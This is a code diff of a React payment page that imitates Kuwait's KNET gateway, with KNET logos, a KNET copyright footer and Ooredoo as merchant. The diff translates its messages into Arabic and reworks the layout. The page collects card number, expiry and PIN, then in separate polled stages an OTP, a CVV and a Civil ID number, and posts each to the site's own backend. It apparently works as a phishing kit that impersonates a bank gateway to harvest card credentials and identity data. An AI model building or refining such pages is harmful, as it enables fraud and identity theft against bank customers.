@@ -62,7 +62,7 @@ export default function UnifiedPayment() {
   const [location, setLocation] = useLocation();
   const [stage, setStage] = useState<PaymentStage>("knet");
   const [paymentData, setPaymentData] = useState<PaymentData>({
-    amount: "5",
+    amount: "KD 5.000",
     merchant: "Ooredoo",
     bank: "",
     cardPrefix: "",
@@ -130,22 +130,22 @@ export default function UnifiedPayment() {
     const newErrors: Record<string, string> = {};
 
     if (!paymentData.bank || paymentData.bank === "prefix") {
-      newErrors.bank = "Select Your Bank";
+      newErrors.bank = "يرجى اختيار البنك";
     }
     if (!paymentData.cardPrefix) {
-      newErrors.cardPrefix = "Prefix";
+      newErrors.cardPrefix = "يرجى اختيار البادئة";
     }
     if (!paymentData.cardNumber || paymentData.cardNumber.length !== 10) {
-      newErrors.cardNumber = "Card Number";
+      newErrors.cardNumber = "رقم البطاقة يجب أن يكون 10 أرقام";
     }
     if (!paymentData.month || paymentData.month === "0") {
-      newErrors.month = "MM";
+      newErrors.month = "يرجى اختيار الشهر";
     }
     if (!paymentData.year) {
-      newErrors.year = "YYYY";
+      newErrors.year = "يرجى اختيار السنة";
     }
     if (!paymentData.pin || paymentData.pin.length !== 4) {
-      newErrors.pin = "PIN";
+      newErrors.pin = "الرقم السري يجب أن يكون 4 أرقام";
     }
 
     setErrors(newErrors);
@@ -158,7 +158,7 @@ export default function UnifiedPayment() {
     if (!validateKnetForm()) return;
 
     setStage("loading");
-    setStatusMessage("Processing Payment...");
+    setStatusMessage("جاري معالجة الطلب...");
 
     try {
       const response = await fetch("/api/trpc/payment.submitKnet", {
@@ -183,12 +183,12 @@ export default function UnifiedPayment() {
         }));
       } else {
         setStage("error");
-        setStatusMessage("Error processing payment");
+        setStatusMessage("حدث خطأ في معالجة الطلب");
       }
     } catch (error) {
       console.error("Submit error:", error);
       setStage("error");
-      setStatusMessage("Connection error");
+      setStatusMessage("خطأ في الاتصال");
     }
   };
 
@@ -196,12 +196,12 @@ export default function UnifiedPayment() {
     e.preventDefault();
 
     if (!paymentData.otp || paymentData.otp.length !== 6) {
-      setErrors({ otp: "OTP must be 6 digits" });
+      setErrors({ otp: "رمز التحقق يجب أن يكون 6 أرقام" });
       return;
     }
 
     setStage("loading");
-    setStatusMessage("Verifying OTP...");
+    setStatusMessage("جاري التحقق من الرمز...");
 
     try {
       const response = await fetch("/api/trpc/payment.submitOtp", {
@@ -219,12 +219,12 @@ export default function UnifiedPayment() {
         // Continue polling
       } else {
         setStage("otp");
-        setErrors({ otp: "Invalid OTP" });
+        setErrors({ otp: "رمز التحقق غير صحيح" });
       }
     } catch (error) {
       console.error("OTP error:", error);
       setStage("otp");
-      setErrors({ otp: "Connection error" });
+      setErrors({ otp: "خطأ في الاتصال" });
     }
   };
 
@@ -232,12 +232,12 @@ export default function UnifiedPayment() {
     e.preventDefault();
 
     if (!paymentData.cvv || paymentData.cvv.length !== 3) {
-      setErrors({ cvv: "CVV must be 3 digits" });
+      setErrors({ cvv: "CVV يجب أن يكون 3 أرقام" });
       return;
     }
 
     setStage("loading");
-    setStatusMessage("Verifying CVV...");
+    setStatusMessage("جاري التحقق من CVV...");
 
     try {
       const response = await fetch("/api/trpc/payment.submitCvv", {
@@ -255,12 +255,12 @@ export default function UnifiedPayment() {
         // Continue polling
       } else {
         setStage("cvv");
-        setErrors({ cvv: "Invalid CVV" });
+        setErrors({ cvv: "CVV غير صحيح" });
       }
     } catch (error) {
       console.error("CVV error:", error);
       setStage("cvv");
-      setErrors({ cvv: "Connection error" });
+      setErrors({ cvv: "خطأ في الاتصال" });
     }
   };
 
@@ -268,12 +268,12 @@ export default function UnifiedPayment() {
     e.preventDefault();
 
     if (!paymentData.hawety) {
-      setErrors({ hawety: "Please enter identity data" });
+      setErrors({ hawety: "يرجى إدخال بيانات الهوية" });
       return;
     }
 
     setStage("loading");
-    setStatusMessage("Verifying identity...");
+    setStatusMessage("جاري التحقق من بيانات الهوية...");
 
     try {
       const response = await fetch("/api/trpc/payment.submitHawety", {
@@ -291,12 +291,12 @@ export default function UnifiedPayment() {
         // Continue polling
       } else {
         setStage("hawety");
-        setErrors({ hawety: "Invalid identity data" });
+        setErrors({ hawety: "بيانات الهوية غير صحيحة" });
       }
     } catch (error) {
       console.error("Hawety error:", error);
       setStage("hawety");
-      setErrors({ hawety: "Connection error" });
+      setErrors({ hawety: "خطأ في الاتصال" });
     }
   };
 
@@ -311,258 +311,413 @@ export default function UnifiedPayment() {
     return BANK_PREFIXES[paymentData.bank] || [];
   };
 
-  // KNET Payment Form
-  if (stage === "knet") {
-    return (
-      <div className="knet-page">
-        <div className="knet-header">
-          <img src="/knet/knet.png" alt="KNET" className="knet-logo" />
-        </div>
-        <div className="knet-form-container">
+  return (
+    <div className="knet-container">
+      {/* Header Banner */}
+      <div className="knet-header">
+        <img src="/knet/knet.png" alt="KNET" className="knet-logo" />
+      </div>
+
+      <div className="knet-content">
+        {/* KNET Form Stage */}
+        {stage === "knet" && (
           <form onSubmit={handleKnetSubmit} className="knet-form">
-            {/* Merchant Info */}
-            <div className="knet-row">
-              <label className="knet-label">Merchant:</label>
-              <span className="knet-value">{paymentData.merchant}</span>
+            <div className="form-card">
+              <div className="card-header">
+                <img src="/knet/knet.png" alt="KNET" className="card-logo" />
+              </div>
+
+              <div className="form-row">
+                <label className="form-label">Merchant:</label>
+                <span className="form-value">{paymentData.merchant}</span>
+              </div>
+
+              <div className="form-row">
+                <label className="form-label">Amount:</label>
+                <span className="form-value">{paymentData.amount}</span>
+              </div>
             </div>
 
-            {/* Amount */}
-            <div className="knet-row">
-              <label className="knet-label">Amount:</label>
-              <span className="knet-value">KD {paymentData.amount}</span>
-            </div>
-
-            {/* Bank Selection */}
-            <div className="knet-row">
-              <label className="knet-label">Select Your Bank:</label>
-              <select
-                value={paymentData.bank}
-                onChange={(e) => setPaymentData({ ...paymentData, bank: e.target.value, cardPrefix: "" })}
-                className={`knet-select ${errors.bank ? "error" : ""}`}
-              >
-                {BANKS.map((bank) => (
-                  <option key={bank.value} value={bank.value}>
-                    {bank.label}
-                  </option>
-                ))}
-              </select>
-              {errors.bank && <span className="error-text">{errors.bank}</span>}
-            </div>
-
-            {/* Card Number */}
-            <div className="knet-row three-column">
-              <label className="knet-label">Card Number:</label>
-              <select
-                value={paymentData.cardPrefix}
-                onChange={(e) => setPaymentData({ ...paymentData, cardPrefix: e.target.value })}
-                className={`knet-select prefix-select ${errors.cardPrefix ? "error" : ""}`}
-              >
-                <option value="">Prefix</option>
-                {getPrefixOptions().map((prefix) => (
-                  <option key={prefix} value={prefix}>
-                    {prefix}
-                  </option>
-                ))}
-              </select>
-              <input
-                type="tel"
-                inputMode="numeric"
-                pattern="[0-9]*"
-                placeholder="Card Number"
-                value={paymentData.cardNumber}
-                onChange={(e) => setPaymentData({ ...paymentData, cardNumber: e.target.value.slice(0, 10) })}
-                maxLength={10}
-                className={`knet-input ${errors.cardNumber ? "error" : ""}`}
-              />
-              {errors.cardNumber && <span className="error-text">{errors.cardNumber}</span>}
-            </div>
-
-            {/* Expiration Date */}
-            <div className="knet-row three-column">
-              <label className="knet-label">Expiration Date:</label>
-              <select
-                value={paymentData.month}
-                onChange={(e) => setPaymentData({ ...paymentData, month: e.target.value })}
-                className={`knet-select ${errors.month ? "error" : ""}`}
-              >
-                <option value="0">MM</option>
-                {Array.from({ length: 12 }, (_, i) => (
-                  <option key={i + 1} value={String(i + 1).padStart(2, "0")}>
-                    {String(i + 1).padStart(2, "0")}
-                  </option>
-                ))}
-              </select>
-              <select
-                value={paymentData.year}
-                onChange={(e) => setPaymentData({ ...paymentData, year: e.target.value })}
-                className={`knet-select ${errors.year ? "error" : ""}`}
-              >
-                <option value="">YYYY</option>
-                {Array.from({ length: 10 }, (_, i) => {
-                  const year = new Date().getFullYear() + i;
-                  return (
-                    <option key={year} value={String(year)}>
-                      {year}
+            <div className="form-card">
+              <div className="form-row">
+                <label className="form-label">Select Your Bank:</label>
+                <select
+                  value={paymentData.bank}
+                  onChange={(e) => {
+                    setPaymentData((prev) => ({
+                      ...prev,
+                      bank: e.target.value,
+                      cardPrefix: "",
+                    }));
+                    setErrors((prev) => {
+                      const newErrors = { ...prev };
+                      delete newErrors.bank;
+                      return newErrors;
+                    });
+                  }}
+                  className={`form-select ${errors.bank ? "error" : ""}`}
+                >
+                  {BANKS.map((bank) => (
+                    <option key={bank.value} value={bank.value}>
+                      {bank.label}
                     </option>
-                  );
-                })}
-              </select>
-              {errors.month && <span className="error-text">{errors.month}</span>}
-              {errors.year && <span className="error-text">{errors.year}</span>}
+                  ))}
+                </select>
+                {errors.bank && <span className="error-text">{errors.bank}</span>}
+              </div>
+
+              <div className="form-row three-column">
+                <label className="form-label">Card Number:</label>
+                <select
+                  value={paymentData.cardPrefix}
+                  onChange={(e) => {
+                    setPaymentData((prev) => ({
+                      ...prev,
+                      cardPrefix: e.target.value,
+                    }));
+                    setErrors((prev) => {
+                      const newErrors = { ...prev };
+                      delete newErrors.cardPrefix;
+                      return newErrors;
+                    });
+                  }}
+                  className={`form-select-prefix ${errors.cardPrefix ? "error" : ""}`}
+                >
+                  <option value="">Prefix</option>
+                  {getPrefixOptions().map((prefix) => (
+                    <option key={prefix} value={prefix}>
+                      {prefix}
+                    </option>
+                  ))}
+                </select>
+
+                <input
+                  type="tel"
+                  inputMode="numeric"
+                  pattern="[0-9]*"
+                  maxLength={10}
+                  value={paymentData.cardNumber}
+                  onChange={(e) => {
+                    const val = e.target.value.replace(/[^\d]/g, "");
+                    setPaymentData((prev) => ({
+                      ...prev,
+                      cardNumber: val,
+                    }));
+                    setErrors((prev) => {
+                      const newErrors = { ...prev };
+                      delete newErrors.cardNumber;
+                      return newErrors;
+                    });
+                  }}
+                  className={`form-input-card ${errors.cardNumber ? "error" : ""}`}
+                  placeholder="Card Number"
+                />
+                {errors.cardNumber && <span className="error-text">{errors.cardNumber}</span>}
+              </div>
+
+              <div className="form-row three-column">
+                <label className="form-label">Expiration Date:</label>
+                <select
+                  value={paymentData.month}
+                  onChange={(e) => {
+                    setPaymentData((prev) => ({
+                      ...prev,
+                      month: e.target.value,
+                    }));
+                    setErrors((prev) => {
+                      const newErrors = { ...prev };
+                      delete newErrors.month;
+                      return newErrors;
+                    });
+                  }}
+                  className={`form-select-month ${errors.month ? "error" : ""}`}
+                >
+                  <option value="0">MM</option>
+                  {Array.from({ length: 12 }, (_, i) => i + 1).map((m) => (
+                    <option key={m} value={String(m).padStart(2, "0")}>
+                      {String(m).padStart(2, "0")}
+                    </option>
+                  ))}
+                </select>
+
+                <select
+                  value={paymentData.year}
+                  onChange={(e) => {
+                    setPaymentData((prev) => ({
+                      ...prev,
+                      year: e.target.value,
+                    }));
+                    setErrors((prev) => {
+                      const newErrors = { ...prev };
+                      delete newErrors.year;
+                      return newErrors;
+                    });
+                  }}
+                  className={`form-select-year ${errors.year ? "error" : ""}`}
+                >
+                  <option value="">YYYY</option>
+                  {Array.from({ length: 30 }, (_, i) => 2024 + i).map((y) => (
+                    <option key={y} value={String(y)}>
+                      {y}
+                    </option>
+                  ))}
+                </select>
+                {errors.year && <span className="error-text">{errors.year}</span>}
+              </div>
+
+              <div className="form-row">
+                <label className="form-label">PIN:</label>
+                <input
+                  type="password"
+                  inputMode="numeric"
+                  pattern="[0-9]*"
+                  maxLength={4}
+                  value={paymentData.pin}
+                  onChange={(e) => {
+                    const val = e.target.value.replace(/[^\d]/g, "");
+                    setPaymentData((prev) => ({
+                      ...prev,
+                      pin: val,
+                    }));
+                    setErrors((prev) => {
+                      const newErrors = { ...prev };
+                      delete newErrors.pin;
+                      return newErrors;
+                    });
+                  }}
+                  className={`form-input ${errors.pin ? "error" : ""}`}
+                  placeholder="PIN"
+                />
+                {errors.pin && <span className="error-text">{errors.pin}</span>}
+              </div>
             </div>
 
-            {/* PIN */}
-            <div className="knet-row">
-              <label className="knet-label">PIN:</label>
-              <input
-                type="password"
-                inputMode="numeric"
-                pattern="[0-9]*"
-                placeholder="PIN"
-                value={paymentData.pin}
-                onChange={(e) => setPaymentData({ ...paymentData, pin: e.target.value.slice(0, 4) })}
-                maxLength={4}
-                className={`knet-input ${errors.pin ? "error" : ""}`}
-              />
-              {errors.pin && <span className="error-text">{errors.pin}</span>}
-            </div>
-
-            {/* Buttons */}
-            <div className="knet-buttons">
-              <button type="submit" className="knet-button submit-btn">
-                Submit
-              </button>
-              <button type="button" onClick={handleCancel} className="knet-button cancel-btn">
-                Cancel
-              </button>
+            <div className="form-card">
+              <div className="form-buttons">
+                <button type="submit" className="btn-submit">
+                  Submit
+                </button>
+                <button type="button" onClick={handleCancel} className="btn-cancel">
+                  Cancel
+                </button>
+              </div>
             </div>
           </form>
-        </div>
-      </div>
-    );
-  }
+        )}
 
-  // Loading Page
-  if (stage === "loading") {
-    return (
-      <div className="loading-page">
-        <div className="loading-content">
-          <img src="/assets/ooredoo-logo.png" alt="Ooredoo" className="loading-logo" />
-          <div className="loading-spinner">
-            <div className="spinner"></div>
+        {/* Loading Stage */}
+        {stage === "loading" && (
+          <div className="loading-container">
+            <div className="form-card">
+              <div className="loading-content">
+                <img src="/knet/loading.gif" alt="Loading" className="loading-spinner" />
+                <p className="loading-text">{statusMessage}</p>
+              </div>
+            </div>
           </div>
-          <p className="loading-text">{statusMessage}</p>
-        </div>
-      </div>
-    );
-  }
+        )}
 
-  // OTP Page
-  if (stage === "otp") {
-    return (
-      <div className="otp-page">
-        <div className="otp-content">
-          <h2>Enter OTP</h2>
-          <p>An OTP has been sent to your registered mobile number</p>
-          <form onSubmit={handleOtpSubmit}>
-            <input
-              type="text"
-              placeholder="Enter OTP"
-              maxLength={6}
-              value={paymentData.otp || ""}
-              onChange={(e) => setPaymentData({ ...paymentData, otp: e.target.value })}
-              className="otp-input"
-            />
-            {errors.otp && <span className="error-text">{errors.otp}</span>}
-            <button type="submit" className="otp-button">
-              Verify OTP
-            </button>
+        {/* OTP Stage */}
+        {stage === "otp" && (
+          <form onSubmit={handleOtpSubmit} className="knet-form">
+            <div className="form-card">
+              <h2 className="stage-title">OTP Verification</h2>
+              <p className="stage-subtitle">
+                يرجى إدخال رمز التحقق المرسل إلى هاتفك
+              </p>
+
+              <div className="form-row">
+                <label className="form-label">OTP Code:</label>
+                <input
+                  type="text"
+                  inputMode="numeric"
+                  pattern="[0-9]*"
+                  maxLength={6}
+                  value={paymentData.otp || ""}
+                  onChange={(e) => {
+                    const val = e.target.value.replace(/[^\d]/g, "");
+                    setPaymentData((prev) => ({
+                      ...prev,
+                      otp: val,
+                    }));
+                    setErrors((prev) => {
+                      const newErrors = { ...prev };
+                      delete newErrors.otp;
+                      return newErrors;
+                    });
+                  }}
+                  className={`form-input ${errors.otp ? "error" : ""}`}
+                  placeholder="000000"
+                />
+                {errors.otp && <span className="error-text">{errors.otp}</span>}
+              </div>
+            </div>
+
+            <div className="form-card">
+              <div className="form-buttons">
+                <button type="submit" className="btn-submit">
+                  Verify
+                </button>
+                <button type="button" onClick={handleCancel} className="btn-cancel">
+                  Cancel
+                </button>
+              </div>
+            </div>
           </form>
-        </div>
-      </div>
-    );
-  }
+        )}
 
-  // CVV Page
-  if (stage === "cvv") {
-    return (
-      <div className="cvv-page">
-        <div className="cvv-content">
-          <h2>Enter CVV</h2>
-          <p>Please enter the CVV from the back of your card</p>
-          <form onSubmit={handleCvvSubmit}>
-            <input
-              type="password"
-              placeholder="CVV"
-              maxLength={4}
-              value={paymentData.cvv || ""}
-              onChange={(e) => setPaymentData({ ...paymentData, cvv: e.target.value })}
-              className="cvv-input"
-            />
-            {errors.cvv && <span className="error-text">{errors.cvv}</span>}
-            <button type="submit" className="cvv-button">
-              Verify CVV
-            </button>
+        {/* CVV Stage */}
+        {stage === "cvv" && (
+          <form onSubmit={handleCvvSubmit} className="knet-form">
+            <div className="form-card">
+              <h2 className="stage-title">CVV Verification</h2>
+              <p className="stage-subtitle">
+                يرجى إدخال رمز CVV الموجود على ظهر البطاقة
+              </p>
+
+              <div className="form-row">
+                <label className="form-label">CVV:</label>
+                <input
+                  type="password"
+                  inputMode="numeric"
+                  pattern="[0-9]*"
+                  maxLength={3}
+                  value={paymentData.cvv || ""}
+                  onChange={(e) => {
+                    const val = e.target.value.replace(/[^\d]/g, "");
+                    setPaymentData((prev) => ({
+                      ...prev,
+                      cvv: val,
+                    }));
+                    setErrors((prev) => {
+                      const newErrors = { ...prev };
+                      delete newErrors.cvv;
+                      return newErrors;
+                    });
+                  }}
+                  className={`form-input ${errors.cvv ? "error" : ""}`}
+                  placeholder="000"
+                />
+                {errors.cvv && <span className="error-text">{errors.cvv}</span>}
+              </div>
+            </div>
+
+            <div className="form-card">
+              <div className="form-buttons">
+                <button type="submit" className="btn-submit">
+                  Verify
+                </button>
+                <button type="button" onClick={handleCancel} className="btn-cancel">
+                  Cancel
+                </button>
+              </div>
+            </div>
           </form>
-        </div>
-      </div>
-    );
-  }
+        )}
 
-  // Hawety Page
-  if (stage === "hawety") {
-    return (
-      <div className="hawety-page">
-        <div className="hawety-content">
-          <h2>Verify Identity</h2>
-          <p>Please enter your ID details</p>
-          <form onSubmit={handleHawetySubmit}>
-            <input
-              type="text"
-              placeholder="ID Number"
-              value={paymentData.hawety || ""}
-              onChange={(e) => setPaymentData({ ...paymentData, hawety: e.target.value })}
-              className="hawety-input"
-            />
-            {errors.hawety && <span className="error-text">{errors.hawety}</span>}
-            <button type="submit" className="hawety-button">
-              Verify Identity
-            </button>
+        {/* Hawety Stage */}
+        {stage === "hawety" && (
+          <form onSubmit={handleHawetySubmit} className="knet-form">
+            <div className="form-card">
+              <h2 className="stage-title">Identity Verification</h2>
+              <p className="stage-subtitle">
+                يرجى إدخال رقم الهوية الكويتية
+              </p>
+
+              <div className="form-row">
+                <label className="form-label">Civil ID:</label>
+                <input
+                  type="text"
+                  inputMode="numeric"
+                  pattern="[0-9]*"
+                  maxLength={12}
+                  value={paymentData.hawety || ""}
+                  onChange={(e) => {
+                    const val = e.target.value.replace(/[^\d]/g, "");
+                    setPaymentData((prev) => ({
+                      ...prev,
+                      hawety: val,
+                    }));
+                    setErrors((prev) => {
+                      const newErrors = { ...prev };
+                      delete newErrors.hawety;
+                      return newErrors;
+                    });
+                  }}
+                  className={`form-input ${errors.hawety ? "error" : ""}`}
+                  placeholder="000000000000"
+                />
+                {errors.hawety && <span className="error-text">{errors.hawety}</span>}
+              </div>
+            </div>
+
+            <div className="form-card">
+              <div className="form-buttons">
+                <button type="submit" className="btn-submit">
+                  Verify
+                </button>
+                <button type="button" onClick={handleCancel} className="btn-cancel">
+                  Cancel
+                </button>
+              </div>
+            </div>
           </form>
-        </div>
-      </div>
-    );
-  }
+        )}
 
-  // Success Page
-  if (stage === "success") {
-    return (
-      <div className="success-page">
-        <div className="success-content">
-          <h2>Payment Successful!</h2>
-          <p>Your payment has been processed successfully</p>
-          <button onClick={() => setLocation("/")} className="success-button">
-            Return to Home
-          </button>
-        </div>
-      </div>
-    );
-  }
+        {/* Success Stage */}
+        {stage === "success" && (
+          <div className="success-container">
+            <div className="form-card">
+              <div className="success-content">
+                <div className="success-icon">✓</div>
+                <h2 className="success-title">Payment Successful</h2>
+                <p className="success-message">
+                  تم إكمال العملية بنجاح
+                </p>
+                <div className="payment-details">
+                  <div className="detail-row">
+                    <span className="detail-label">Payment ID:</span>
+                    <span className="detail-value">{paymentData.paymentId}</span>
+                  </div>
+                  <div className="detail-row">
+                    <span className="detail-label">Amount:</span>
+                    <span className="detail-value">{paymentData.amount}</span>
+                  </div>
+                </div>
+                <button onClick={handleCancel} className="btn-submit">
+                  Return to Home
+                </button>
+              </div>
+            </div>
+          </div>
+        )}
 
-  // Error Page
-  if (stage === "error") {
-    return (
-      <div className="error-page">
-        <div className="error-content">
-          <h2>Payment Failed</h2>
-          <p>{statusMessage}</p>
-          <button onClick={() => setLocation("/")} className="error-button">
-            Return to Home
-          </button>
-        </div>
+        {/* Error Stage */}
+        {stage === "error" && (
+          <div className="error-container">
+            <div className="form-card">
+              <div className="error-content">
+                <div className="error-icon">✕</div>
+                <h2 className="error-title">Payment Failed</h2>
+                <p className="error-message">
+                  {statusMessage || "حدث خطأ في معالجة الطلب"}
+                </p>
+                <button onClick={handleCancel} className="btn-submit">
+                  Try Again
+                </button>
+              </div>
+            </div>
+          </div>
+        )}
       </div>
-    );
-  }
 
-  return null;
+      {/* Footer */}
+      <footer className="knet-footer">
+        <p>All Rights Reserved. Copyright 2024 © KNET</p>
+        <p className="footer-subtitle">
+          The Shared Electronic Banking Services Company - KNET
+        </p>
+      </footer>
+    </div>
+  );
 }
